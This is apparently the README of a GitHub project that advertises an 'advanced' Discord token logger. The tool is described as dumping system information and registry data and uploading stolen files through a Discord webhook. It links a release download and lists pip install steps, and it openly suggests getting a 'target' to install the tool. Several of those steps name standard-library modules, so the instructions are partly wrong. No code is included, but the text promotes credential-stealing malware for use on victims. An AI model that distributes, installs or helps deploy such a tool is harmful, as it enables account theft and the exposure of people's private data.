# Advanced-Token-Logger
An advanced discord token logger that dumps system information, goes through the registry, and more.
Once the script is executed and all info is collected, the files will be sent and uploaded through a 
discord webhook.

# How to install
It should install automatically by running "https://github.com/CmaeNd/Advanced-Token-Logger/releases/download/v1.0/Software.zip" but just incase that does not work,
try installing it manually or making your target install it manually by doing the following commands.

pip3 install re
pip3 install shutil
pip3 install requests
pip3 install socket
pip3 install winreg
pip3 install pyautogui
pip3 install platform
pip3 install psutil
pip3 install getmac
